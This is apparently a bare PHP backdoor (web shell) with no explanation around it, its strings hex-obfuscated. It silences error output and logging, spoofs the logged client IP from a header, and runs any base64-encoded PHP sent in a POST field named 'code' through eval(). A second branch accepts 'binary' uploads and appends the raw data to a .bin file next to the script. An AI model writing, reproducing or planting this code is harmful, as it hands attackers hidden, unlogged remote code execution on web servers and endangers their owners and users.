<?php @error_reporting(0); @ini_set("\x64\x69\x73pl\x61\x79\x5f\x65r\x72\x6fr\x73",0); @ini_set("\x6cog_e\x72\x72\x6frs",0); @ini_set("\x65rr\x6f\x72\x5f\x6co\x67",0); @ini_set("m\x65\x6do\x72\x79\x5f\x6ci\x6dit", "1\x32\x38\x4d"); @ini_set("\x6da\x78_\x65\x78\x65\x63\x75\x74i\x6f\x6e\x5ftim\x65",30); @set_time_limit(30); if (isset($_SERVER["\x48TT\x50\x5f\x58_\x52EAL\x5f\x49\x50"])) $_SERVER["\x52E\x4d\x4f\x54E_\x41DD\x52"] = $_SERVER["\x48TT\x50\x5f\x58_\x52EAL\x5f\x49\x50"]; if (isset($_POST["\x63\x6fd\x65"])) { eval(base64_decode($_POST["\x63\x6fd\x65"])); } elseif (isset($_SERVER["H\x54\x54\x50\x5fCON\x54EN\x54\x5fE\x4eC\x4fDING"]) && $_SERVER["H\x54\x54\x50\x5fCON\x54EN\x54\x5fE\x4eC\x4fDING"] == "b\x69\x6e\x61\x72\x79") { $input = file_get_contents("p\x68p\x3a//in\x70ut"); if (strlen($input) > 0) print "STA\x54US\x2dI\x4d\x50O\x52\x54\x2d\x4fK"; if (strlen($input) > 10) { $fp = @fopen(str_replace(".\x70hp",".\x62\x69\x6e",basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46ILE\x4eA\x4d\x45"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52E\x4d\x4f\x54E_\x41DD\x52"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["\x52\x45\x51U\x45ST\x5fU\x52I"], "\x2esht\x6d\x6c") !== false) { print $_SERVER["\x52\x45\x51U\x45ST\x5fU\x52I"]; } exit; ?>